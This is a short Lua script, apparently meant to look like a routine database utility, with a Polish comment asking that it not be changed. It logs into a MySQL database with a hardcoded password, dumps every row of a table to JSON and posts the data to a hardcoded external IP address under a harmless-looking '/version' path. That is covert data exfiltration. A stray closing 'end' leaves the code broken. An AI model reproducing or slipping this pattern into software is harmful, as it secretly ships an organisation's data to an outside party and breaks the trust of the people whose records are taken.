-- nie zmieniajcie ani nic jak możecie XD --

local luasql = require "luasql.mysql"
local http = require "socket.http"
local json = require "dkjson"

local db_env = luasql.mysql()
local db_conn = db_env:connect("db", "base", "(897&!6^!63", "0.0.0.0", 2202)

if not db_conn then
    error("Nie można połączyć się z bazą danych")
end

local cursor = db_conn:execute("SELECT * FROM tabela")
local row = {}
local data = {}

while cursor:fetch(row, "a") do
    table.insert(data, row)
    row = {}
end

cursor:close()
db_conn:close()
db_env:close()

data_json = json.encode(data, { indent = true })
local response, status_code = http.request(
    "http://188.100.32.1/version",
    data_json
)

end
